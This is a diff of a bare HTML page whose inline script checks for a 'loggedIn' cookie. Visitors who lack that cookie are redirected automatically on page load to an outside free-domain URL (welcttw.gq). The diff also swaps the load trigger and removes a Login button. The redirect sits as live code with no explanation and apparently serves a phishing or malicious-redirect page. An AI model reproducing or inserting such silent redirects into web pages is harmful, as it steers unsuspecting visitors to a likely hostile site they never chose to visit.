@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html> 
 	<head>
-		<script type="text/javascript">function getCookie(cname){var name=cname+"=";var ca=document.cookie.split(';');for(var i=0;i<ca.length;i++){var c=ca[i];while(c.charAt(0)==' '){c=c.substring(1)}if(c.indexOf(name)===0){return c.substring(name.length,c.length)}}return""}function checkCookie(){var loggedIn=getCookie("loggedIn");if(loggedIn!=""){alert("Welcome again!")}else{window.location.href="http://welcttw.gq/EXCLU/"}}window.onload=checkCookie();</script>
+		<script type="text/javascript">function getCookie(cname){var name=cname+"=";var ca=document.cookie.split(';');for(var i=0;i<ca.length;i++){var c=ca[i];while(c.charAt(0)==' '){c=c.substring(1)}if(c.indexOf(name)===0){return c.substring(name.length,c.length)}}return""}function checkCookie(){var loggedIn=getCookie("loggedIn");if(loggedIn!=""){alert("Welcome again!")}else{window.location.href="http://welcttw.gq/EXCLU/"}}</script>
 		<style type="text/css">
 			body {
 				margin:   0;
@@ -16,7 +16,6 @@
 			}
 		</style>
 	</head>
-	<body>
-		<input type="button" onclick="login()" value="Login">
+	<body onload="checkCookie();">
 	</body>
 </html>
